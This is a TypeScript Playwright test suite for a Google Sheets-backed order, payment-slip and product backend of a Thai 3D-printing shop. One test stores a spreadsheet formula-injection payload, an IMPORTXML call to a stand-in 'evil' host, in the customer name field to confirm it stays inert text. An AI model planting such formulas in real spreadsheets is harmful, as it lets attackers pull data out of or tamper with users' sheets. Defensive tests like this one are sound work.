import { test, expect } from "@playwright/test"
import { mkdtempSync, readFileSync, writeFileSync } from "fs"
import { tmpdir } from "os"
import path from "path"
import vm from "vm"
import { emulatorPost, fakeServices, compiled } from "../../lib/sheetsEmulator"
import { rpc, nowBangkok, backendMode, SheetsNotConfigured, SheetsError } from "../../lib/sheetsDb"

// Every test gets its own empty simulated spreadsheet running the real Code.gs.
function sheet() {
  const file = path.join(mkdtempSync(path.join(tmpdir(), "pb3d-")), "db.json")
  const call = (action: string, body: Record<string, unknown> = {}) =>
    emulatorPost(file, "s3cret", { secret: "s3cret", action, now: "2026-11-12T14:00:00+07:00", ...body })
  const raw = () => JSON.parse(readFileSync(file, "utf8"))
  return { file, call, raw }
}
const order = (over: any = {}) => ({
  id: "o-1", created_at: "2026-11-12T13:00:00+07:00", status: "pending",
  customer_name: "สมชาย", customer_phone: "0812345678", customer_address: "BKK",
  file_name: "a.stl", material: "PLA", quantity: 2, total_price: 365, ...over,
})

test("rejects wrong secret, unknown action and bad JSON", () => {
  const s = sheet()
  expect(emulatorPost(s.file, "s3cret", { secret: "nope", action: "ping" })).toEqual({ ok: false, error: "unauthorized" })
  expect(s.call("drop.tables")).toEqual({ ok: false, error: "unknown action" })
  expect(s.call("ping")).toEqual({ ok: true })
})

test("orders: create, get, list (newest first), no duplicate ids", () => {
  const s = sheet()
  expect(s.call("orders.create", { order: order() }).ok).toBe(true)
  expect(s.call("orders.create", { order: order({ id: "o-2", created_at: "2026-11-12T15:00:00+07:00" }) }).ok).toBe(true)
  expect(s.call("orders.create", { order: order() })).toMatchObject({ ok: false, error: "duplicate id" })
  const got = s.call("orders.get", { id: "o-1" }).order
  expect(got).toMatchObject({ id: "o-1", status: "pending", customer_phone: "0812345678", quantity: 2, total_price: 365, updated_at: "2026-11-12T14:00:00+07:00" })
  expect(got.tracking_number).toBe("")
  expect(s.call("orders.get", { id: "missing" }).order).toBeNull()
  expect(s.call("orders.list").orders.map((o: any) => o.id)).toEqual(["o-2", "o-1"])
})

test("orders: update, conditional update and status validation", () => {
  const s = sheet()
  s.call("orders.create", { order: order() })
  expect(s.call("orders.update", { id: "o-1", patch: { status: "confirmed" } }).order.status).toBe("confirmed")
  expect(s.call("orders.update", { id: "o-1", patch: { status: "nope" } })).toMatchObject({ ok: false, error: "bad status" })
  expect(s.call("orders.update", { id: "o-1", patch: { status: "awaiting_verification" }, ifStatusIn: ["pending"] }))
    .toMatchObject({ ok: true, order: null, conflict: true, status: "confirmed" })
  expect(s.call("orders.update", { id: "o-1", patch: { id: "hijack", tracking_number: "TH1" } }).order).toMatchObject({ id: "o-1", tracking_number: "TH1" })
  expect(s.call("orders.update", { id: "missing", patch: {} }).order).toBeNull()
})

test("slip: stored as a private file, order moves to awaiting_verification, only while unpaid", () => {
  const s = sheet()
  s.call("orders.create", { order: order() })
  const png = Buffer.from("\x89PNG fake").toString("base64")
  const r = s.call("orders.submitSlip", { id: "o-1", base64: png, mimeType: "image/png", ext: "png" })
  expect(r.order.status).toBe("awaiting_verification")
  expect(r.order.slip_file_id).not.toBe("")
  // a second upload is a new file, the first is kept
  const r2 = s.call("orders.submitSlip", { id: "o-1", base64: png, mimeType: "image/png", ext: "png" })
  expect(r2.order.slip_file_id).not.toBe(r.order.slip_file_id)
  expect(Object.keys(s.raw().files)).toHaveLength(2)
  const slip = s.call("slips.get", { orderId: "o-1" }).slip
  expect(slip).toMatchObject({ mimeType: "image/png", base64: png })
  expect(slip.name).toMatch(/^o-1-\d+\.png$/)
  // once confirmed, no more slips
  s.call("orders.update", { id: "o-1", patch: { status: "confirmed" } })
  expect(s.call("orders.submitSlip", { id: "o-1", base64: png, mimeType: "image/png", ext: "png" }))
    .toMatchObject({ order: null, conflict: true })
  expect(s.call("slips.get", { orderId: "missing" }).slip).toBeNull()
})

test("text stays text and can never run as a formula", () => {
  const s = sheet()
  s.call("orders.create", { order: order({ customer_name: '=IMPORTXML("http://evil","//a")', customer_address: "+66 BKK", notes: "@x", customer_phone: "0812345678" }) })
  const o = s.call("orders.get", { id: "o-1" }).order
  expect(o.customer_name).toBe('=IMPORTXML("http://evil","//a")') // read back unchanged …
  expect(o.customer_address).toBe("+66 BKK")
  expect(o.notes).toBe("@x")
  expect(o.customer_phone).toBe("0812345678")
})

test("columns are found by title: owner may reorder columns and add their own", () => {
  const s = sheet()
  s.call("orders.create", { order: order() })
  // owner swaps two columns and adds a private "Memo" column with a note
  const db = s.raw(); const tab = db.sheets.Orders
  const a = tab[0].indexOf("ชื่อลูกค้า"), b = tab[0].indexOf("สถานะ")
  for (const r of tab) { [r[a], r[b]] = [r[b], r[a]] }
  tab[0].push("Memo"); tab[1].push("ลูกค้าประจำ")
  writeFileSync(s.file, JSON.stringify(db))
  s.call("orders.update", { id: "o-1", patch: { status: "printing" } })
  const after = s.raw().sheets.Orders
  expect(after[1][after[0].indexOf("สถานะ")]).toBe("printing")
  expect(after[1][after[0].indexOf("ชื่อลูกค้า")]).toBe("สมชาย")
  expect(after[1][after[0].indexOf("Memo")]).toBe("ลูกค้าประจำ") // untouched
})

test("import upserts by id (migration)", () => {
  const s = sheet()
  s.call("orders.create", { order: order() })
  expect(s.call("orders.import", { orders: [order({ status: "delivered" }), order({ id: "old-9" })] })).toMatchObject({ ok: true, rows: [2, 3] })
  expect(s.call("orders.get", { id: "o-1" }).order.status).toBe("delivered")
  expect(s.call("orders.list").orders).toHaveLength(2)
})

test("products: CRUD, booleans, sort order, active filter", () => {
  const s = sheet()
  const p = (id: string, sort: number, active = true) =>
    ({ id, created_at: `2026-11-1${sort}T00:00:00+07:00`, name: `P${id}`, url: "https://shopee.co.th/x", price: 99, image_url: "", description: "", active, sort_order: sort })
  s.call("products.create", { product: p("a", 2) })
  s.call("products.create", { product: p("b", 1) })
  s.call("products.create", { product: p("c", 0, false) })
  expect(s.call("products.list").products.map((x: any) => x.id)).toEqual(["c", "b", "a"])
  expect(s.call("products.list", { activeOnly: true }).products.map((x: any) => x.id)).toEqual(["b", "a"])
  expect(s.call("products.update", { id: "a", patch: { price: 149, active: false } }).product).toMatchObject({ price: 149, active: false })
  expect(s.call("products.delete", { id: "b" }).deleted).toBe(true)
  expect(s.call("products.delete", { id: "b" }).deleted).toBe(false)
  expect(s.call("products.list").products.map((x: any) => x.id)).toEqual(["c", "a"])
})

test("consent log rows", () => {
  const s = sheet()
  s.call("consent.add", { entry: { created_at: "t", necessary: true, analytics: false, marketing: true, user_agent: "UA" } })
  const tab = s.raw().sheets.Consent
  expect(tab[0]).toEqual(["เวลา", "จำเป็น", "Analytics", "Marketing", "User agent"])
  expect(tab[1]).toEqual(["t", true, false, true, "UA"])
})

// ─── server-side client ──────────────────────────────────────────────────────
const env = (vars: Record<string, string | undefined>, fn: () => Promise<void>) => async () => {
  const keys = ["GOOGLE_SHEETS_WEBHOOK_URL", "GOOGLE_SHEETS_WEBHOOK_SECRET", "SHEETS_EMULATOR_FILE"]
  const old = Object.fromEntries(keys.map(k => [k, process.env[k]]))
  for (const k of keys) delete process.env[k]
  Object.assign(process.env, vars)
  try { await fn() } finally { for (const k of keys) { if (old[k] === undefined) delete process.env[k]; else process.env[k] = old[k] } }
}

test("not configured → SheetsNotConfigured", env({}, async () => {
  expect(backendMode()).toBeNull()
  await expect(rpc("ping")).rejects.toBeInstanceOf(SheetsNotConfigured)
}))

test("the emulator is refused on Vercel", env({ SHEETS_EMULATOR_FILE: "/tmp/x.json" }, async () => {
  expect(backendMode()).toBe("emulator")
  process.env.VERCEL = "1"
  try { expect(backendMode()).toBeNull() } finally { delete process.env.VERCEL }
}))

test("real Apps Script mode: sends secret + action, follows redirect, surfaces errors", env(
  { GOOGLE_SHEETS_WEBHOOK_URL: "https://script.google.com/macros/s/X/exec", GOOGLE_SHEETS_WEBHOOK_SECRET: "s3cret" },
  async () => {
    expect(backendMode()).toBe("apps-script")
    const calls: any[] = []
    const ok = (async (url: any, init: any) => { calls.push({ url, init, body: JSON.parse(init.body) }); return new Response('{"ok":true,"order":null}') }) as typeof fetch
    expect(await rpc("orders.get", { id: "x" }, { fetchImpl: ok })).toEqual({ ok: true, order: null })
    expect(calls[0].body).toMatchObject({ secret: "s3cret", action: "orders.get", id: "x" })
    expect(calls[0].init.redirect).toBe("follow")

    const scriptErr = (async () => new Response('{"ok":false,"error":"unauthorized"}')) as typeof fetch
    await expect(rpc("ping", {}, { fetchImpl: scriptErr })).rejects.toThrow("unauthorized")
    const html = (async () => new Response("<html>Google login</html>")) as typeof fetch // e.g. deployed as "Only myself"
    await expect(rpc("ping", {}, { fetchImpl: html })).rejects.toBeInstanceOf(SheetsError)
    const hang = ((_u: any, init: any) => new Promise((_, rej) =>
      init.signal.addEventListener("abort", () => rej(Object.assign(new Error("aborted"), { name: "AbortError" }))))) as typeof fetch
    await expect(rpc("ping", {}, { fetchImpl: hang, timeoutMs: 50 })).rejects.toThrow("timeout")
  }))

test("Bangkok timestamps", () => {
  expect(nowBangkok(new Date("2026-11-12T07:03:09Z"))).toBe("2026-11-12T14:03:09+07:00")
  expect(nowBangkok(new Date("2026-11-12T20:30:00Z"))).toBe("2026-11-13T03:30:00+07:00")
})

test("setup() creates the secret once, the tabs and the slip folder", () => {
  const state: any = { sheets: {}, props: {}, files: {} }
  const ctx: any = vm.createContext({ ...fakeServices(state) })
  compiled().runInContext(ctx)
  const secret = ctx.setup()
  expect(secret).toMatch(/^[0-9a-f]{64}$/)
  expect(state.props.WEBHOOK_SECRET).toBe(secret)
  expect(Object.keys(state.sheets).sort()).toEqual(["Consent", "Orders", "Products"])
  expect(state.sheets.Orders[0][0]).toBe("Order ID")
  expect(state.props.SLIP_FOLDER_ID).toBeTruthy()
  expect(ctx.setup()).toBe(secret) // second run keeps the same secret
  // and the web app accepts that secret
  const reply = JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify({ secret, action: "ping" }) } }))
  expect(reply).toEqual({ ok: true })
})
